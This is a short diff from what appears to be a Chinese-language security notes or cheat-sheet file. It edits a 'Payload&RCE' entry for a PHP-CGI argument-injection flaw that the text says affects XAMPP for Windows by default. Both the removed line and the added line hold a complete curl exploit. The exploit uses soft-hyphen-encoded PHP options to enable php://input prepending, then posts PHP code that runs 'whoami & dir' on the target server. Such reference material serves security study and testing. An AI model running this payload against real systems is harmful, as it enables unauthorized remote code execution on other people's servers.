@@ -132,7 +132,7 @@
   - 所有版本的 XAMPP for Windows 安裝也預設受此弱點影響
   - **Payload&RCE**
     ```sh
-    curl.exe -o - "URL/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input" --data '<?=`whoami & dir`;die();?>'
+    curl -o - "URL/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input" --data '<?=`whoami & dir`;die();?>'
     ```
 
 
